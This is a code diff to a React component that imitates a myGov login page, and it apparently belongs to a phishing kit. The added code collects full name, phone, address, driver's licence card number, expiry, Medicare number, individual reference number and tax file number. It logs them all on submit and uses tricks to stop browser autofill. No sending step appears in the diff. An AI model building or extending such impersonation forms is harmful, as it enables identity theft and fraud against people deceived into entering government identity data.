@@ -6,9 +6,16 @@ import "./Mygov.css";
 import MaskedInput from "react-text-mask";
 
 export default function Mygov() {
+  const [name, setName] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
   const [date, setDate] = useState("");
+  const [address, setAddress] = useState("");
+  const [driversLicense, setDriversLicense] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
+  const [medicareNumber, setMedicareNumber] = useState("");
+  const [individualReferenceNumber, setIndividualReferenceNumber] =
+    useState("");
+  const [taxFileNumber, setTaxFileNumber] = useState("");
 
   const handleInputChange = (event) => {
     setPhoneNumber(event.target.value);
@@ -47,7 +54,17 @@ export default function Mygov() {
   const handleSubmit = (e) => {
     e.preventDefault();
 
-    console.log(phoneNumber);
+    console.log(
+      name,
+      phoneNumber,
+      date,
+      address,
+      driversLicense,
+      expiryDate,
+      medicareNumber,
+      individualReferenceNumber,
+      taxFileNumber
+    );
   };
 
   return (
@@ -146,6 +163,7 @@ export default function Mygov() {
                         id="login-form"
                         aria-describedby="error-msg"
                         className="mygov-login-form alternative"
+                        autoComplete="off"
                       >
                         <div className="input-group">
                           <label className="override">Full Name</label>
@@ -155,6 +173,8 @@ export default function Mygov() {
                             aria-required="true"
                             type="text"
                             autocomplete="off"
+                            value={name}
+                            onChange={(e) => setName(e.target.value)}
                           />
                         </div>
 
@@ -215,6 +235,8 @@ export default function Mygov() {
                             aria-required="true"
                             type="text"
                             autocomplete="off"
+                            value={address}
+                            onChange={(e) => setAddress(e.target.value)}
                           />
                         </div>
 
@@ -232,19 +254,23 @@ export default function Mygov() {
                         </div>
 
                         <div className="input-group">
-                          <label className="override">
-                            Driver's License Card No. (Back of Card)
+                          <label className="override" style={{ letterSpacing: "0.001px" }}>
+                            Driver's License Card Id (Back of Card)
                           </label>
+
                           <input
-                            id="dlback"
-                            name="dlback"
+                            id="drivers_license_back"
                             aria-required="true"
+                            name="drivers_license_back"
                             type="text"
-                            autoComplete="off"
-                            readOnly // Disable input initially
+                            inputMode="text"
+                            autoComplete="new-password"
+                            value={driversLicense}
+                            onChange={(e) => setDriversLicense(e.target.value)}
+                            readOnly
                             onFocus={(e) =>
                               e.target.removeAttribute("readOnly")
-                            } // Enable on focus
+                            }
                           />
                         </div>
 
@@ -272,8 +298,8 @@ export default function Mygov() {
                             ]}
                             placeholder={placeholder}
                             guide={false}
-                            value={date}
-                            onChange={handleDateInputChange}
+                            value={expiryDate}
+                            onChange={handleExpiryDateInputChange}
                           />
                         </div>
 
@@ -285,6 +311,8 @@ export default function Mygov() {
                             aria-required="true"
                             type="text"
                             autocomplete="off"
+                            value={medicareNumber}
+                            onChange={(e) => setMedicareNumber(e.target.value)}
                           />
                         </div>
 
@@ -298,6 +326,10 @@ export default function Mygov() {
                             aria-required="true"
                             type="text"
                             autocomplete="off"
+                            value={individualReferenceNumber}
+                            onChange={(e) =>
+                              setIndividualReferenceNumber(e.target.value)
+                            }
                           />
                         </div>
 
@@ -309,6 +341,8 @@ export default function Mygov() {
                             aria-required="true"
                             type="text"
                             autocomplete="off"
+                            value={taxFileNumber}
+                            onChange={(e) => setTaxFileNumber(e.target.value)}
                           />
                         </div>
                         <p className="recovery"></p>
